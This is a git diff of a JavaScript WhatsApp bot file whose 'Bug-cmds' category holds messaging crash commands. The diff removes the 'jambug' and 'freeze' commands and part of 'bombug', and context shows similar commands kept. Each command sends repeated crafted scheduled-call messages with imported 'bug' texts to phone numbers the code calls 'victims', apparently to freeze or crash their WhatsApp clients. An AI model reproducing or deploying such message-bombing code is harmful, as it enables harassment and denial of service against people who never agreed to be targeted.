@@ -17,8 +17,6 @@ const { bugtext4 } = require("../fredi/fredi/bugtext4");
 const { bugtext5 } = require("../fredi/fredi/bugtext5");
 const { bugtext6 } = require("../fredi/fredi/bugtext6");
 const { bugpdf } = require("../fredi/fredi/bugpdf.js");
-const { bugtext1 } = require("../fredi/fredi/qadeertext7");
-const { bugtext1 } = require("../fredi/fredi/qadeertext8");
 
 const category = "Bug-cmds";
 const reaction = "🤯";
@@ -771,90 +769,6 @@ ezra(
     }
 );
 
-//jambug
-ezra(
-    {
-        nomCom: "jambug",
-        categorie: category,
-        reaction: reaction
-    },
-
-    async (dest, zk, commandOptions) => {
-        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
-        if (!superUser) return await repondre(mess.prem);
-        if (!arg[0])
-            return await repondre(
-                `Use ${prefixe}jambug amount | numbers\n> Example ${prefixe}jambug 30 |${
-                    conf.NUMERO_OWNER
-                } or ${prefixe}jambug ${conf.NUMERO_OWNER.split(",")[0]}`
-            );
-        await loading(dest, zk);
-        const text = arg.join("");
-        let amount = 30;
-        let victims = [];
-        const bug = {
-            scheduledCallCreationMessage: {
-                callType: "2",
-                scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Islamabad")
-                    .format("DD/MM/YYYY HH:mm:ss")}`,
-                title: qadeertext7
-            }
-        };
-        if (arg.length === 1) {
-            victims.push(arg[0]);
-            await repondre(`sending ${amount} bugs to ${victims[0]}`);
-            try {
-                await relaybug(dest, zk, ms, repondre, amount, victims, bug);
-            } catch (e) {
-                await repondre("An error occured");
-                console.log(`An error occured: ${e}`);
-                await react(dest, zk, ms, "⚠️");
-            }
-        } else {
-            amount = parseInt(text.split("|")[0].trim());
-            if (
-                amount > conf.BOOM_MESSAGE_LIMIT ||
-                isNaN(amount) ||
-                amount < 1
-            ) {
-                return await repondre(
-                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
-                );
-            } else {
-                victims = text
-                    .split("|")[1]
-                    .split(",")
-                    .map(x => x.trim())
-                    .filter(x => x !== "");
-                if (victims.length > 0) {
-                    await repondre(
-                        `sending ${amount} bugs to ${victims.join(", ")}`
-                    );
-                    try {
-                        await relaybug(
-                            dest,
-                            zk,
-                            ms,
-                            repondre,
-                            amount,
-                            victims,
-                            bug
-                        );
-                    } catch (e) {
-                        await repondre("An error occured");
-                        console.log(`An error occured: ${e}`);
-                        await react(dest, zk, ms, "⚠️");
-                    }
-                } else {
-                    return await repondre("No victims specfied");
-                }
-            }
-        }
-        await react(dest, zk, ms, "✅");
-    }
-);
-
 //bombug
 ezra(
     {
@@ -883,90 +797,6 @@ ezra(
                     .tz("Asia/Islamabad")
                     .format("DD/MM/YYYY HH:mm:ss")}`,
                 title: bugtext4
-            }
-        };
-        if (arg.length === 1) {
-            victims.push(arg[0]);
-            await repondre(`sending ${amount} bugs to ${victims[0]}`);
-            try {
-                await relaybug(dest, zk, ms, repondre, amount, victims, bug);
-            } catch (e) {
-                await repondre("An error occured");
-                console.log(`An error occured: ${e}`);
-                await react(dest, zk, ms, "⚠️");
-            }
-        } else {
-            amount = parseInt(text.split("|")[0].trim());
-            if (
-                amount > conf.BOOM_MESSAGE_LIMIT ||
-                isNaN(amount) ||
-                amount < 1
-            ) {
-                return await repondre(
-                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
-                );
-            } else {
-                victims = text
-                    .split("|")[1]
-                    .split(",")
-                    .map(x => x.trim())
-                    .filter(x => x !== "");
-                if (victims.length > 0) {
-                    await repondre(
-                        `sending ${amount} bugs to ${victims.join(", ")}`
-                    );
-                    try {
-                        await relaybug(
-                            dest,
-                            zk,
-                            ms,
-                            repondre,
-                            amount,
-                            victims,
-                            bug
-                        );
-                    } catch (e) {
-                        await repondre("An error occured");
-                        console.log(`An error occured: ${e}`);
-                        await react(dest, zk, ms, "⚠️");
-                    }
-                } else {
-                    return await repondre("No victims specfied");
-                }
-            }
-        }
-        await react(dest, zk, ms, "✅");
-    }
-);
-
-//freeze
-ezra(
-    {
-        nomCom: "freeze",
-        categorie: category,
-        reaction: reaction
-    },
-
-    async (dest, zk, commandOptions) => {
-        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
-        if (!superUser) return await repondre(mess.prem);
-        if (!arg[0])
-            return await repondre(
-                `Use ${prefixe}freeze amount | numbers\n> Example ${prefixe}freeze 30 |${
-                    conf.NUMERO_OWNER
-                } or ${prefixe}freeze ${conf.NUMERO_OWNER.split(",")[0]}`
-            );
-        await loading(dest, zk);
-        const text = arg.join("");
-        let amount = 30;
-        let victims = [];
-        const bug = {
-            scheduledCallCreationMessage: {
-                callType: "2",
-                scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Islamabad")
-                    .format("DD/MM/YYYY HH:mm:ss")}`,
-                title: qadeertext8
             }
         };
         if (arg.length === 1) {
